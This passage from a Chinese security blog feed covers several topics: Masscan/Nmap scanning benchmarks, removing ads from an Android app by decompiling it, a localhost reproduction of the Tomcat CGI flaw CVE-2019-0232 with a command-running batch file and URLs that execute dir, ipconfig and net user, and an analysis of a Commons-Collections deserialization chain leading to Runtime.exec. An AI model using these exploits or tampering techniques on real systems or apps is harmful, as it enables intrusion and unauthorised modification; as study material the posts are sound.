HOSTS</span><br></pre></td></tr></table></figure><p>下图显示了上述命令的运行情况：</p><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g652vr1jn2j30uo0mqwfp.jpg" alt=""></p><p>下面的命令用于获取Masscan检测到的所有开放端口的组合列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Ports:&quot; MASSCAN_OUTPUT.gnmap | cut -d &quot; &quot; -f4 | cut -d &quot;/&quot; -f1 | sort -n | uniq | paste -sd, &gt; OPEN_PORTS</span><br></pre></td></tr></table></figure><p>下图显示了上述命令的运行情况：</p><p><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g652w3x1n8j30yo01zdgc.jpg" alt=""></p><p>下面的命令用户Nmap的常规扫描：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sSV -p OPEN_PORTS -v --open -Pn -n --randomize-hosts -T4 -iL HOSTS -oA OUTPUT</span><br></pre></td></tr></table></figure><p>以下命令用于运行并发的Nmap扫描任务。使用上面命令生成的主机列表和开放端口的组合列表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat HOSTS | parallel -j JOBS &quot;sudo nmap -sSV -p OPEN_PORTS -v --open -Pn -n --randomize-hosts -T4 &#123;&#125; -oA &#123;&#125;&quot;</span><br></pre></td></tr></table></figure><p><strong>使用的并发任务数：</strong></p><ul><li>0 (这是常规的nmap扫描)</li><li>10</li><li>50</li><li>100</li></ul><p><strong>图表如下：</strong></p><p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g652wku9bbj31ex0u04gh.jpg" alt=""></p><p><strong>观察：</strong></p><p>运行常规的Nmap扫描时，CPU的利用率仅为10%左右；</p><p>常规的Nmap扫描发现了更多的开放端口，而并发的Nmap扫描发现的开放端口较少一些。</p><p>与基线（上面图表中的绿色条）相比，在某些目标网络（子网A）上识别出更多的开放端口，而在其他的网络目标（子网B和子网C）上检测到的开放端口较少，在某些网络目标（子网D）上没有太大差异。</p><h4 id="Nmap检测到的其他开放端口"><a href="#Nmap检测到的其他开放端口" class="headerlink" title="Nmap检测到的其他开放端口"></a>Nmap检测到的其他开放端口</h4><p>先看下面的表格。例如，让我们假设Masscan在每台主机上检测到以下的开放端口（表格第2列）。在运行Nmap扫描时，Masscan检测到的所有开放端口将用作Nmap的目标端口（表格第3列）。</p><p>在我们的示例中，Nmap在完成扫描后检测到的新开放的端口（第4列中的<strong>粗体文字</strong>）。这种情况是怎么发生的？Masscan是一个异步的扫描器，主机192.168.1.2和192.168.1.3上可能丢失了22端口。由于我们合并了每个主机上检测到的开放端口，并将它们作为Nmap的目标端口，因此这个丢失的22端口将再次进行探测。需要注意的是，无法保证Nmap能够将其检测为开放状态，因为还有其他可能影响扫描结果的因素。</p><table><thead><tr><th>主机</th><th>Masscan检测到的端口</th><th>Nmap扫描的目标端口</th><th>Nmap运行后检测到的开放端口</th></tr></thead><tbody><tr><td>192.168.1.1</td><td>22,80,443</td><td>22,80,443,8080,8888</td><td>22,80,443</td></tr><tr><td>192.168.1.2</td><td>8080,8888</td><td>22,80,443,8080,8888</td><td><strong>22</strong>,8080,888</td></tr><tr><td>192.168.1.3</td><td>80,443</td><td>22,80,443,8080,8888</td><td><strong>22</strong>,80,443</td></tr></tbody></table><h3 id="测试用例-4-扫描由Masscan识别的特定主机上的特定开放端口"><a href="#测试用例-4-扫描由Masscan识别的特定主机上的特定开放端口" class="headerlink" title="测试用例 4 扫描由Masscan识别的特定主机上的特定开放端口"></a>测试用例 4 扫描由Masscan识别的特定主机上的特定开放端口</h3><p>这个与之前的测试用例有点类似。在这个用例中，我没有将Masscan检测到的所有开放端口与每个主机组合在一起。无论Masscan在特定主机上检测到哪些开放端口，Nmap都将使用相同的端口作为目标端口。下表说明了我们这个测试用例中的操作：</p><table><thead><tr><th>主机</th><th>Masscan检测到的端口</th><th>Nmap扫描的目标端口</th></tr></thead><tbody><tr><td>192.168.1.1</td><td>22,80,443</td><td>22,80,443</td></tr><tr><td>192.168.1.2</td><td>8080,8888</td><td>8080,8888</td></tr><tr><td>192.168.1.3</td><td>80,443</td><td>80,443</td></tr></tbody></table><p>以下命令用于获取主机列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat MASSCAN_OUTPUT.gnmap | grep Host | awk &apos;&#123;print $2,$5&#125;&apos; | sed &apos;s@/.*@@&apos; | sort -t&apos; &apos; -n -k2 | awk -F&apos; &apos; -v OFS=&apos; &apos; &apos;&#123;x=$1;$1=&quot;&quot;;a[x]=a[x]&quot;,&quot;$0&#125;END&#123;for(x in a) print x,a[x]&#125;&apos; | sed &apos;s/, /,/g&apos; | sed &apos;s/ ,/ /&apos; | sort -V -k1 | cut -d &quot; &quot; -f1 &gt; HOSTS</span><br></pre></td></tr></table></figure><p>下图显示了上述命令的运行情况：</p><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g652xe34mnj316u0n940l.jpg" alt=""></p><p>要从每个主机获取打开的端口列表，执行以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat MASSCAN_OUTPUT.gnmap | grep Host | awk &apos;&#123;print $2,$5&#125;&apos; | sed &apos;s@/.*@@&apos; | sort -t&apos; &apos; -n -k2 | awk -F&apos; &apos; -v OFS=&apos; &apos; &apos;&#123;x=$1;$1=&quot;&quot;;a[x]=a[x]&quot;,&quot;$0&#125;END&#123;for(x in a) print x,a[x]&#125;&apos; | sed &apos;s/, /,/g&apos; | sed &apos;s/ ,/ /&apos; | sort -V -k1 | cut -d &quot; &quot; -f2 &gt; OPEN_PORTS</span><br></pre></td></tr></table></figure><p>下图显示了上述命令的运行情况：</p><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g652xtim3lj316s0n3mze.jpg" alt=""></p><p>可以看到，上图输出的内容于测试用例 #3中的不同，而且使用的命令也不一样。我们查询出每个主机的开放端口列表，而不是所有开放端口的组合。</p><p>然后使用parallel命令的<code>::::</code>选项将上面两个命令查询出的列表，并发执行Nmap扫描。</p><blockquote><p><em>如果您不熟悉GNU Parallel，请查看本教程。</em></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parallel -j JOBS --link &quot;sudo nmap -sSV -p &#123;2&#125; -v --open -Pn -n -T4 &#123;1&#125; -oA &#123;1&#125;&quot; :::: HOSTS :::: OPEN_PORTS</span><br></pre></td></tr></table></figure><p>这是个例子，当执行上述parallel命令后，并扫描时会发生什么（多条命令同时执行）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sSV -p 443 -v --open -Pn -n -T4 192.168.1.2 -oA 192.168.1.2</span><br><span class="line">sudo nmap -sSV -p 80,443,1935,9443 -v --open -Pn -n -T4 192.168.1.5 -oA 192.168.1.5</span><br><span class="line">sudo nmap -sSV -p 80 -v --open -Pn -n -T4 192.168.1.6 -oA 192.168.1.6</span><br><span class="line">sudo nmap -sSV -p 80,443 -v --open -Pn -n -T4 192.168.1.7 -oA 192.168.1.7</span><br><span class="line">sudo nmap -sSV -p 08,443 -v --open -Pn -n -T4 192.168.1.9 -oA 192.168.1.9</span><br></pre></td></tr></table></figure><p>下图展示了测试用例执行时，发生的一个片段。如下图所示，使用parallel运行10个并发的Nmap扫描。</p><p><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g652y9g3y6j30z60cw77r.jpg" alt=""></p><p><strong>使用的并发任务数：</strong></p><ul><li>10</li><li>50</li><li>100</li></ul><p><strong>图表如下：</strong></p><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g652zg7k3gj31ex0u0k9z.jpg" alt=""></p><p><strong>观察：</strong></p><ul><li>更多的并发任务和以100%的CPU利用率进行扫描时，检测出更少的开放端口。</li><li>10个和50个Nmap并发任务，扫描结果差别不大，因此建议可以运行50个并发任务，以减少扫描时间。</li><li>此测试用例比测试用例 #3的扫描速度略快，但是检测出的开放端口较少。</li></ul><p><strong>原始数据</strong></p><p>下表显示了使用上述不同的Nmap测试用例进行实验的原始数据：</p><p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g652zvlu4oj34ka0u0hdv.jpg" alt=""></p><h3 id="Nmap结论："><a href="#Nmap结论：" class="headerlink" title="Nmap结论："></a>Nmap结论：</h3><p>根据使用Nmap进行的实验结果，得出以下结论：</p><ul><li>测试用例 #3（扫描Masscan识别出的开放端口和主机的组合列表）可获得最佳的结果。这也是推荐的方法，因为可以发现额外的端口开放；</li><li>以100%的CPU利用率进行扫描，会导致检测出更少的开放端口；</li><li>使用并发任务时，更少的任务数会导致检测出更多的开放端口；</li></ul><h2 id="0x09-研究结论"><a href="#0x09-研究结论" class="headerlink" title="0x09 研究结论"></a>0x09 研究结论</h2><h3 id="推荐的扫描方法"><a href="#推荐的扫描方法" class="headerlink" title="推荐的扫描方法"></a>推荐的扫描方法</h3><p>根据对Masscan和Nmap进行的多个测试用例的测试结果，建议采用以下方法在端口扫描期间实现速度和精度之间的平衡：</p><ol><li>首先运行2或3个并发的Masscan任务，所有的65535个端口分为4-5个更小的范围；</li><li>获取主机列表以及Masscan扫描出的开放端口的组合列表；</li><li>使用这些列表作为Nmap的扫描目标并执行常规Nmap扫描。</li></ol><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>对于这两种扫描端口的工具，应采用以下的预防措施进行规避，因为它们会导致检测到的开放端口更少：</p><ul><li>扫描时避免CPU过载。</li><li>不要使用扫描机器的最大速率容量。</li><li>避免运行太多并行任务。</li></ul><h2 id="0x10-最后的想法"><a href="#0x10-最后的想法" class="headerlink" title="0x10 最后的想法"></a>0x10 最后的想法</h2><p>虽然这项研究提供了一种如何在互联网端口扫描期间平衡速度和准确性的方法，但读者不应将此结论视为100％可靠。由于时间和预算有限，研究期间没有涵盖其他的影响因素。最值得注意的是，在整个研究期间仅使用一个IP地址进行扫描并不是一个好的设置。因为在我多次扫描相同的目标网络后，机器的IP地址可能会以某种方式被拉黑，这可能导致检测到的开放端口数量不太一致。</p><p>请重新查看<strong>0x06 范围和限制</strong>部分，因为从中可以很好的理解影响本研究结果的一些因素。</p><h2 id="0x11-Reference"><a href="#0x11-Reference" class="headerlink" title="0x11 Reference"></a>0x11 Reference</h2><p><strong>文章翻译自：</strong> <a href="https://captmeelo.com/pentest/2019/07/29/port-scanning.html" target="_blank" rel="noopener">https://captmeelo.com/pentest/2019/07/29/port-scanning.html</a></p><p><strong>作者：</strong> Capt. Meelo</p>]]></content>
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> 端口扫描 </tag>
            
            <tag> 扫描速度 </tag>
            
            <tag> 扫描准确度 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>手机应用去除广告</title>
      <link href="/%E6%89%8B%E6%9C%BA%E5%BA%94%E7%94%A8%E5%8E%BB%E9%99%A4%E5%B9%BF%E5%91%8A/"/>
      <url>/%E6%89%8B%E6%9C%BA%E5%BA%94%E7%94%A8%E5%8E%BB%E9%99%A4%E5%B9%BF%E5%91%8A/</url>
      <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h2><p>​    大部分的应用中在刚打开APP或者APP中的某个部分都会插入一些广告，所以这篇文章主要分析如何去除手机APP中广告的内容，这里用<strong>车来了</strong>这款APP来进行分析，下载地址：链接:<a href="https://pan.baidu.com/s/1y0TRR-QWSVQPTQ-e-4QsLw" target="_blank" rel="noopener">https://pan.baidu.com/s/1y0TRR-QWSVQPTQ-e-4QsLw</a>  密码:4jvo</p><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fzsa40j77qj31gy0fydra.jpg" alt=""></p><h2 id="2、使用到的工具"><a href="#2、使用到的工具" class="headerlink" title="2、使用到的工具"></a>2、使用到的工具</h2><ul><li>网易MuMu模拟器</li><li>AndroidCrackTool</li><li>Android Studio</li><li>Dalvik Debug Monitor Service(DDMS)</li></ul><h2 id="3、工具介绍"><a href="#3、工具介绍" class="headerlink" title="3、工具介绍"></a>3、工具介绍</h2><p>DDMS是SDK套件中的一个调试工具，主要可以插桩打印一些异常堆栈信息、模拟电话呼叫等功能</p><p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fzsba0ww0lj31u10u0q9u.jpg" alt=""></p><p>DDMS 工具存放在 SDK 的 tools 路径下，可直接双击使用</p><p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fzsb2gsquzj30yw0hk0yn.jpg" alt=""></p><p>如果DDMS出现找不到设备的问题，adb devices查看一下，adb kill-server   —&gt;   adb start-server就搞定了</p><h2 id="4、逆向分析"><a href="#4、逆向分析" class="headerlink" title="4、逆向分析"></a>4、逆向分析</h2><p>应用包名信息如下：</p><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fzsbj9k2yoj30qc0xwk2l.jpg" alt=""></p><p>我们先用DDMS进行调试，过滤包名信息</p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0ixkc9611j31kb0u0qlo.jpg" alt=""></p><p>这里就是过滤后的内容，会看到关于包名的一些相关内容，如初始化信息、广告信息、版本信息、一些加载流程等等等等</p><p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0ixp43v97j31m10u0qhb.jpg" alt=""></p><p>在打开APP弹出广告信息的时候，DDMS请求广告的内容也会显示出来</p><p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0iy2an6rwj30mo18mwx7.jpg" alt=""></p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0iy1h9mcwj30mq18q446.jpg" alt=""></p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0ixt5ilb8j327q0ha0yy.jpg" alt=""></p><p>我们反编译后直接搜索与广告相关的信息，然后删除掉就可以</p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0iy874npdj31kc0u0aoi.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1g0iycgonixj31vo0u0tl3.jpg" alt=""></p><p>我们把一些关于广告的内容删除掉后重新编译</p><p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0iygeo8uwj30u00wan4p.jpg" alt=""></p><p>这样重新编译的apk就不会带有任何的广告信息</p><p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0iykzri67j30lw18g426.jpg" alt=""></p>]]></content>
      
      <categories>
          
          <category> 安卓逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓逆向 </tag>
            
            <tag> 去除广告 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Apache Tomcat 远程代码执行漏洞复现（CVE-2019-0232）</title>
      <link href="/Apache-Tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2019-0232%EF%BC%89/"/>
      <url>/Apache-Tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2019-0232%EF%BC%89/</url>
      <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><p><script type="text/javascript" src="/js/src/bai.js"></script></p><h2 id="1、漏洞信息"><a href="#1、漏洞信息" class="headerlink" title="1、漏洞信息"></a>1、漏洞信息</h2><p>漏洞编号：CVE-2019-0232</p><p>漏洞名称：CVE-2019-0232-远程代码执行漏洞</p><p>影响版本：</p><ul><li>Apache Tomcat 9.0.0.M1 to 9.0.17</li><li>Apache Tomcat 8.5.0 to 8.5.39</li><li>Apache Tomcat 7.0.0 to 7.0.93</li></ul><p>漏洞描述：</p><p>​&emsp;&emsp;Apache Tomcat在启用了enableCmdLineArguments的Windows上运行时，由于JRE将命令行参数传递给Windows的方式存在错误，通过此漏洞，CGI Servlet可以受到攻击者的远程执行代码攻击。<br>​&emsp;&emsp;但是在默认情况下，Tomcat 9.0.x中禁用了CGI选项enableCmdLineArguments（默认情况下，在所有版本中都会禁用它以防御此漏洞）</p><p>测试平台：Windows</p><p>测试环境：Tomcat 8.5.39</p><h2 id="2、漏洞验证"><a href="#2、漏洞验证" class="headerlink" title="2、漏洞验证"></a>2、漏洞验证</h2><h3 id="2-1-安装Tomcat"><a href="#2-1-安装Tomcat" class="headerlink" title="2.1 安装Tomcat"></a>2.1 安装Tomcat</h3><p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1g2b5bgzr02j31oe0u04ce.jpg" alt=""></p><h3 id="2-2-初始化参数"><a href="#2-2-初始化参数" class="headerlink" title="2.2 初始化参数"></a>2.2 初始化参数</h3><p>修改<strong>/apache-tomcat-8.5.39//conf/web.xml</strong>文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>cgi<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.catalina.servlets.CGIServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>debug<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>0<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>cgiPathPrefix<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>WEB-INF/cgi-bin<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>executable<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">param-value</span>&gt;</span><span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>5<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span> </span><br><span class="line">......</span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>cgi<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/cgi-bin/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改<strong>/apache-tomcat-8.5.39/conf/content.xml</strong>文件，将<strong>Context</strong>属性里面添加<strong>privileged=”true”</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Context</span> <span class="attr">privileged</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Default set of monitored resources. If one of these changes, the    --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- web application will be reloaded.                                   --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">WatchedResource</span>&gt;</span>WEB-INF/web.xml<span class="tag">&lt;/<span class="name">WatchedResource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">WatchedResource</span>&gt;</span>$&#123;catalina.base&#125;/conf/web.xml<span class="tag">&lt;/<span class="name">WatchedResource</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    &lt;Manager pathname="" /&gt;</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Context</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-3-编写测试脚本"><a href="#2-3-编写测试脚本" class="headerlink" title="2.3 编写测试脚本"></a>2.3 编写测试脚本</h3><p>在<strong>/apache-tomcat-8.5.39/webapps/ROOT/WEB-INF</strong>下创建<strong>cgi-bin</strong>目录，创建<strong>hello.bat</strong>文件</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> Content-<span class="built_in">Type</span>: text/plain</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">set</span> foo=%~<span class="number">1</span></span><br><span class="line"><span class="variable">%foo%</span></span><br></pre></td></tr></table></figure><h2 id="3、复现成功"><a href="#3、复现成功" class="headerlink" title="3、复现成功"></a>3、复现成功</h2><blockquote><p><a href="http://localhost:8080/cgi-bin/hello.bat?dir" target="_blank" rel="noopener">http://localhost:8080/cgi-bin/hello.bat?dir</a></p><p><a href="http://localhost:8080/cgi-bin/hello.bat?C:/Windows/System32/ipconfig" target="_blank" rel="noopener">http://localhost:8080/cgi-bin/hello.bat?C:/Windows/System32/ipconfig</a></p><p><a href="http://localhost:8080/cgi-bin/hello.bat?C:/Windows/System32/net%20user" target="_blank" rel="noopener">http://localhost:8080/cgi-bin/hello.bat?C:/Windows/System32/net%20user</a></p></blockquote><p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1g2b7gdxidwj31ie0cs768.jpg" alt=""></p><p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1g2b7k8b5oxj31d80oc785.jpg" alt=""></p><p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1g2b7kwx77oj31d00b83zr.jpg" alt=""></p><h2 id="4、参考链接"><a href="#4、参考链接" class="headerlink" title="4、参考链接"></a>4、参考链接</h2><ul><li><a href="https://github.com/pyn3rd/CVE-2019-0232" target="_blank" rel="noopener">https://github.com/pyn3rd/CVE-2019-0232</a></li></ul>]]></content>
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远程代码执行 </tag>
            
            <tag> Apache Tomcat </tag>
            
            <tag> CGI Servlet </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Apache-Commons-Collections反序列化漏洞分析及POC构造</title>
      <link href="/Apache-Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0/"/>
      <url>/Apache-Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0/</url>
      <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><p><script type="text/javascript" src="/js/src/bai.js"></script></p><h2 id="1-反序列化的原因"><a href="#1-反序列化的原因" class="headerlink" title="1.反序列化的原因"></a>1.反序列化的原因</h2><p>如果Java应用对用户输入的内容做了序列化，但是用户输入的内容是不可信的数据，进行了恶意构造，那么在对恶意构造的数据做反序列化处理，就会产生的非预期对象，在这个过程中就可能带来任意代码执行。</p><h2 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2.漏洞原理"></a>2.漏洞原理</h2><p>在进行Map转换时，修改Map中的key和value会调用接口，触发内置的transform来获取类名、方法对象进行反射，其中传入的方法名，参数类型等都是可控的，那么我们就可以构造ChainedTransformer来进行反射，调用任意函数</p><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>commons-collections&lt;=3.2.1存在漏洞</p><h2 id="4-下载地址"><a href="#4-下载地址" class="headerlink" title="4.下载地址"></a>4.下载地址</h2><p>本文对commons-collections-3.2.1进行漏洞分析，下载地址：<a href="https://github.com/SQYY/Apache-Commons-Collections/raw/master/commons-collections-3.2.1-1.0.0.jar" target="_blank" rel="noopener">https://github.com/SQYY/Apache-Commons-Collections/raw/master/commons-collections-3.2.1-1.0.0.jar</a></p><h2 id="5-漏洞分析"><a href="#5-漏洞分析" class="headerlink" title="5.漏洞分析"></a>5.漏洞分析</h2><p>在<code>org/apache/commons/collections/map/TransformedMap.class</code>中可以看到<strong>decorate()</strong>方法，它是将一个Map对象，转换成TransformedMap对象。</p><p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1g0u8z23gvej31n80madk9.jpg" alt=""></p><p>可以看到它会把它的三个参数带入到<strong>TransformedMap</strong>方法中，并返回实例化的结果。而在这个方法中，如上图所示，就是将<strong>Map</strong>中的<strong>key</strong>和<strong>value</strong>转换成<strong>TransformedMap</strong>中的<strong>key</strong>和<strong>value</strong></p><p>而<code>transform</code>是一个接口，即可实现数据变换的操作。当Map中的任意项的Key或者value被修改，这个接口就会被调用。</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0uervni1rj313805udgn.jpg" alt=""></p><p>在<code>org/apache/commons/collections/functors/InvokerTransformer.class</code>中，也是我们核心的关键点，可以看到它实现了<strong>transform</strong>和<strong>Serializable</strong>这两个接口</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0uay7bi1fj31aw0f6ad0.jpg" alt=""></p><p>可以看到<strong>transform</strong>中，首先会<strong>getClass</strong>获取传入参数的类名，再通过<strong>getMethod</strong>获取方法对象，最后调用<strong>invoke</strong>进行反射</p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0ubgo5abkj31kj0u0wlq.jpg" alt=""></p><p>就是说只需要传入方法名、参数类型和参数，我们就可以通过Java的反射机制可以调用任意函数。</p><h2 id="6-构造POC"><a href="#6-构造POC" class="headerlink" title="6.构造POC"></a>6.构造POC</h2><p>那么我们重要的是多个Transformer能串联起来，形成ChainedTransformer，让它依次执行便可序列化。</p><p>我们要构造一个实例，修改其中的数据，让它依次调用<strong>Runtime</strong> –&gt;<strong>getRuntime()</strong>–&gt;<strong>exec()</strong>，执行<code>Runtime.getRuntime().exec()</code>，便可序列化</p><p>首先需要<strong>ConstantTransformer()</strong>获取了<strong>Runtime</strong>类，接着调用<strong>getMethod</strong>方法来定位需要查找的<strong>getRuntime</strong>，再反射调用<strong>getRuntime</strong>中的的<strong>exec()</strong>，最终执行命令</p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0uc3wuqosj31ju0d8n0f.jpg" alt=""></p><p>而<strong>decorate()</strong>就是将<strong>Map</strong>转换成<strong>TransformedMap</strong>，这里我们再看一遍这个方法，它的第三个参数就是Transformer类型</p><p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1g0u8z23gvej31n80madk9.jpg" alt=""></p><p>那么我们可以将构造的内容当做第三个参数传入进去</p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0ucamht5uj318i070dha.jpg" alt=""></p><p>完整POC地址：<a href="https://github.com/SQYY/Apache-Commons-Collections/blob/master/POC.java" target="_blank" rel="noopener">https://github.com/SQYY/Apache-Commons-Collections/blob/master/POC.java</a></p><h2 id="7-参考链接"><a href="#7-参考链接" class="headerlink" title="7.参考链接"></a>7.参考链接</h2><ul><li><p><a href="https://paper.seebug.org/312/#6-java-apache-commonscollections-rce" target="_blank" rel="noopener">https://paper.seebug.org/312/#6-java-apache-commonscollections-rce</a></p></li><li><p><a href="https://xz.aliyun.com/t/136" target="_blank" rel="noopener">https://xz.aliyun.com/t/136</a></p></li><li><p><a href="http://pirogue.org/2017/12/22/javaSerialKiller/" target="_blank" 